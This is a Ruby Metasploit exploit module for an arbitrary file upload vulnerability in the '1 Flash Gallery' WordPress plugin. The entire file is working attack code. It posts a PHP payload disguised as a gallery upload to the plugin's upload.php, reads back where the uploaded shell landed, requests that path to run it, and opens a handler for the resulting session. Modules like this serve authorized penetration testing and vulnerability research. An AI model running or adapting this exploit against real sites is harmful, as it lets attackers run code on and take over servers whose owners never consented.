	
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '1 Flash Gallery Wordpress Plugin File Upload Exploit',
			'Description'    => %q{
            This module exploits an arbitrary file upload vulnerability in
            the '1 Flash Gallery' Wordpress plugin.
			},
			'Author'         => [ 'Ben Schmidt'],
			'License'        => MSF_LICENSE,
			'References'     => ["http://spareclockcycles.org/2011/09/06/flash-gallery-arbitrary-file-upload/" ],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					# Arbitrary big number. The payload gets sent as an HTTP
					# POST request, so it's possible this might be smaller (maybe?)
                    # but very unlikely.
					'Space'       => 262144, # 256k
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DefaultTarget' => 0,
            'DisclosureDate' => 'Sept 6, 2011'
            ))

		register_options([
				OptString.new('URI', [true, "Path to Wordpress", "/"]),
			], self.class)
	end

    def exploit
		boundary = rand_text_alphanumeric(6)
        fn = rand_text_alphanumeric(8)
		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filedata\"; "
		data << "filename=\"#{fn}.php\"\r\nContent-Type: application/x-httpd-php\r\n\r\n"
		data << payload.encoded
		data << "\r\n--#{boundary}--"

		res = send_request_raw({
			'uri'	  => datastore['URI'] + "/wp-content/plugins/1-flash-gallery/upload.php?action=uploadify&fileext=php",
			'method'  => 'POST',
			'data'    => data,
			'headers' =>
			{
				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary,
				'Content-Length' => data.length,
			}
		}, 25)

        if (res)
			print_status("Successfully uploaded shell.")
            shell_path = res.body.split("_")[0]
            print_status("Trying to access shell at #{shell_path}...")
            res = send_request_raw({
                'uri'	  => datastore['URI'] + shell_path,
                'method'  => 'GET',
            }, 0.01)

		else
			print_error("Error uploading shell")
		end

        handler
    end
end